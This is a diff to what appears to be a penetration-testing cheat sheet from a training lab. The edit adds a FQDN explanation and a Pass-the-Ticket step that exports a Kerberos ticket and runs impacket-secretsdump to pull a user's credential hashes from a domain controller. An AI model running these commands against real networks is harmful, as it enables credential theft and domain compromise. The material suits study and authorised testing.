@@ -37,9 +37,18 @@ python3 gettgtpkinit.py -cert-pfx <CERTIFICATE_FILEPATH> -dc-ip <DOMAIN_CONTROLL
 
 ## 4. Pass the Ticket (PtT)
 
+- `FQDN` = Fully Qualified Domain Name. For example :- An approximate structure is shown below. 
+
+```
+   [ Hostname ]  .  [ Parent Domain ]  .  [ Top-Level Domain ]
+       DC01      .     INLANEFREIGHT   .         LOCAL
+```
+
+- `export` or load you current **Kerberos Ticket** in the current shell environment variable `KRB5CCNAME` and then authenticate yourself.
+
 ```bash
 export KRB5CCNAME=<KERBEROS_TICKET_FILENAME>
-impacket-secretsdump -k -no-pass -dc-ip <DOMAIN_CONTROLLER_IP> -just-dc-user <DOMAIN_USER> '<DOMAIN_CONTROLLER_ACCOUNTNAME>'<DOMAIN_NAME>
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <TARGET_USER> '<DOMAIN_NAME>/<IDENTITY_ACCOUNT_NAME>'@<TARGET_SERVER_FQDN>
 ```
 
 
